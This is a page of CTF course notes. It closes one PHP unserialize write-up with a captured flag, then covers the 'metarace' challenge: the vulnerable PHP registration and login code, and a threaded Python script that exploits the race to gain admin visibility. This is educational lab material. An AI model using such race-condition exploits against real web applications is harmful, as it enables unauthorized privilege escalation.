        <doc-anchor-trigger class="header-anchor-trigger" to="#welcome-to-metactf-1">#</doc-anchor-trigger>
        <span>Welcome to METACTF</span>
    </h1>
</doc-anchor-target>
<p>User Backup file:</p>
<p>Load User</p>
<p>Stoping challenge!flag{nice_yuo_got_the_unserialize_flag!}</p>
</blockquote>
<doc-anchor-target id="metarace">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#metarace">#</doc-anchor-trigger>
        <span>metarace</span>
    </h2>
</doc-anchor-target>
<p>Same webapp as metactf, but different exploit: we need to registrate, login and get to the homepage before that the registration is finished. This is because at registration time the user is setted as non admin, which means that he cannot see all the challenges present in the database. If we are able to send a login request and to get the index.php faster than that, we&#x27;ll be able to print what we need.</p>
<ul>
<li><p><code v-pre>register.php</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-php"><code v-pre class="language-php">$db-&gt;create_user($name, $password);
$id = $db-&gt;get_idusers($name);
if ($db-&gt;get_admin($id) &amp;&amp;  $db-&gt;get_username($id) === $name){
  $db-&gt;fix_user($id);
}</code></pre>
</doc-codeblock></div>
</li>
<li><p><code v-pre>login.php</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-php"><code v-pre class="language-php">$id = $db-&gt;login($name, $password);
if (($id != 0) &amp;&amp; !is_null($id)){
  echo(&quot;&lt;h3&gt;Login Completed!&lt;/h3&gt;&quot;);
  $_SESSION['challenges'] = $db-&gt;get_challenges($id, $db-&gt;get_admin($id) );
  $_SESSION['user'] = new User($id, $db-&gt;get_username($id));
}</code></pre>
</doc-codeblock></div>
</li>
<li><p><code v-pre>db.php</code></p>
<ul>
<li><p><code v-pre>fix_user</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-php"><code v-pre class="language-php">function fix_user($idusers){
        /* Prepared statement, stage 1: prepare */
        if (!($stmt = $this-&gt;mysqli-&gt;prepare(&quot;UPDATE users SET isadmin = 0 WHERE idusers = ?&quot;))) {
            echo &quot;Prepare failed: (&quot; . $this-&gt;mysqli-&gt;errno . &quot;) &quot; . $this-&gt;mysqli-&gt;error;
        }

        /* Prepared statement, stage 2: bind and execute */
        if (!$stmt-&gt;bind_param(&quot;i&quot;, $idusers)) {
            echo &quot;Binding parameters failed: (&quot; . $stmt-&gt;errno . &quot;) &quot; . $stmt-&gt;error;
        }

        if (!$stmt-&gt;execute()) {
            echo &quot;Execute failed: (&quot; . $stmt-&gt;errno . &quot;) &quot; . $stmt-&gt;error;
        }

    }</code></pre>
</doc-codeblock></div>
</li>
<li><p><code v-pre>get_admin()</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-php"><code v-pre class="language-php">function get_admin($id){
        /* Prepared statement, stage 1: prepare */
        if (!($stmt = $this-&gt;mysqli-&gt;prepare(&quot;SELECT isadmin FROM users WHERE idusers=?&quot;))) {
            echo &quot;Prepare failed: (&quot; . $this-&gt;mysqli-&gt;errno . &quot;) &quot; . $this-&gt;mysqli-&gt;error;
        }

        /* Prepared statement, stage 2: bind and execute */
        if (!$stmt-&gt;bind_param(&quot;i&quot;, $id)) {
            echo &quot;Binding parameters failed: (&quot; . $stmt-&gt;errno . &quot;) &quot; . $stmt-&gt;error;
        }

        if (!$stmt-&gt;execute()) {
            echo &quot;Execute failed: (&quot; . $stmt-&gt;errno . &quot;) &quot; . $stmt-&gt;error;
        }

        if (!($res = $stmt-&gt;get_result())) {
            echo &quot;Getting result set failed: (&quot; . $stmt-&gt;errno . &quot;) &quot; . $stmt-&gt;error;
        }
        $info = $res-&gt;fetch_assoc();
        $isadmin = $info['isadmin'] == 1;
        $res-&gt;close();
        return $isadmin;
    }</code></pre>
</doc-codeblock></div>
</li>
<li><p><code v-pre>get_challenges()</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-php"><code v-pre class="language-php">function get_challenges($id, $isadmin){
        if ($isadmin){
            /* Prepared statement, stage 1: prepare */
            if (!($stmt = $this-&gt;mysqli-&gt;prepare(&quot;SELECT name, descriptions, points FROM challenges&quot;))) {
                echo &quot;Prepare failed: (&quot; . $this-&gt;mysqli-&gt;errno . &quot;) &quot; . $this-&gt;mysqli-&gt;error;
            }
        }
        else{
            /* Prepared statement, stage 1: prepare */
            if (!($stmt = $this-&gt;mysqli-&gt;prepare(&quot;SELECT name, descriptions, points FROM challenges WHERE isenabled=true&quot;))) {
                echo &quot;Prepare failed: (&quot; . $this-&gt;mysqli-&gt;errno . &quot;) &quot; . $this-&gt;mysqli-&gt;error;
            }

        }

        if (!$stmt-&gt;execute()) {
            echo &quot;Execute failed: (&quot; . $stmt-&gt;errno . &quot;) &quot; . $stmt-&gt;error;
        }

        if (!($res = $stmt-&gt;get_result())) {
            echo &quot;Getting result set failed: (&quot; . $stmt-&gt;errno . &quot;) &quot; . $stmt-&gt;error;
        }
        $challenges = array();

        while ($info = $res-&gt;fetch_assoc()){
            array_push($challenges, $info);
        }
        $res-&gt;close();
        return $challenges;
    }</code></pre>
</doc-codeblock></div>
</li>
</ul>
<doc-anchor-target id="the-solution-1">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#the-solution-1">#</doc-anchor-trigger>
        <span>The solution</span>
    </h3>
</doc-anchor-target>
<p>Quite straightforward: we setup two threads and we try to login and get to the home page of the website while the registration is still ongoing in order to be faster than the <code v-pre>fix_user</code> function, which would block access to the database.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-python"><code v-pre class="language-python">def registration(s, user, password):
  url = &quot;%s/register.php&quot; % HOST
  r = s.post(url, data={'username': user, 'password_1': password, 'password_2': password, 'reg_user': ''})
  #get_body(r)
  if &quot;Registration Completed!&quot; in r.text:
    return True
  return False

def login(s, user, password):
  url = &quot;%s/login.php&quot; % HOST
  r = s.post(url, data={'username': user, 'password': password, 'log_user' : ''})
  r = s.get(HOST)
  if 'flag{' in r.text:
    get_body(r)

print('setting up session...')
s = Session()
print('starting loop...')
while True:
  username = randomString(10)
  password = randomString(10)
  r = threading.Thread(target=registration, args=(s, username, password))
  l = threading.Thread(target=login, args=(s, username, password))
  r.start()
  l.start()</code></pre>
</doc-codeblock></div>
</li>
</ul>

                                
                                <!-- Required only on API pages -->
                                <doc-toolbar-member-filter-no-results />
                            </div>
                            <footer class="clear-both">
                                <div class="flex flex-wrap items-center justify-between mt-14">
                                    <a class="my-2.5 inline-flex items-center text-sm whitespace-nowrap text-blue-500 dark:text-blue-400 hover:text-blue-700 hover:underline" href="https://github.com/francesco-plt/odc/blob/main/06-serialization.md" target="_blank" rel="noopener">
                                        <svg class="mr-1.5" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M20 12c-.55 0-1 .45-1 1v7c0 .55-.45 1-1 1H4c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h7c.55 0 1-.45 1-1s-.45-1-1-1H4C2.35 3 1 4.35 1 6v14c0 1.65 1.35 3 3 3h14c1.65 0 3-1.35 3-3v-7c0-.55-.45-1-1-1z" /><path d="M22.21 1.79c-1.18-1.18-3.24-1.18-4.41 0l-9.5 9.5c-.13.13-.22.29-.26.46l-1 4c-.08.34.01.7.26.95.18.2.44.3.7.3.08 0 .16-.01.24-.03l4-1c.18-.04.34-.13.46-.26l9.5-9.5c1.22-1.22 1.22-3.2.01-4.42zm-1.42 3l-9.3 9.3-2.11.53.53-2.11 9.3-9.3c.42-.42 1.16-.42 1.59 0 .43.43.43 1.15-.01 1.58z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                        <span>Edit this page</span>
                                    </a>
                                </div>
                            
                                <nav class="flex mt-14">
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../02-rop/">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                            <span>
                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
                                                <span class="block mt-1">ROP</span>
                                            </span>
                                        </a>
                                    </div>
                            
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../01-shellcode/">
                                            <span>
                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
                                                <span class="block mt-1">Shellcode</span>
                                            </span>
                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                        </a>
                                    </div>
                                </nav>
                            </footer>
                        </main>
                
                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
                            <footer class="flex flex-wrap items-center justify-between">
                                <div>
                                    <ul class="flex flex-wrap items-center text-sm">
                                        <li>
                                            <a class="block mr-4 py-2 text-sm whitespace-nowrap transition-colors duration-200 ease-linear text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200 md:mb-0" href="">License</a>
                                        </li>
                                    </ul>
                                </div>
                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"></div>
                            </footer>
                        </div>
                    </div>
                
                    <!-- Rendered if sidebar right is enabled -->
                    <!-- Sidebar right skeleton-->
                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
                        <div class="pl-5">
                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                        </div>
                    </div>
                
                    <!-- User should be able to hide sidebar right -->
                    <doc-sidebar-right v-cloak></doc-sidebar-right>
                </div>

            </div>
        </div>
    
        <doc-search-mobile></doc-search-mobile>
        <doc-back-to-top></doc-back-to-top>
    </div>


    <div id="docs-overlay-target"></div>

    <script>window.__DOCS__ = { "title": "Serialization", level: 1, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false }</script>
</body>
</html>
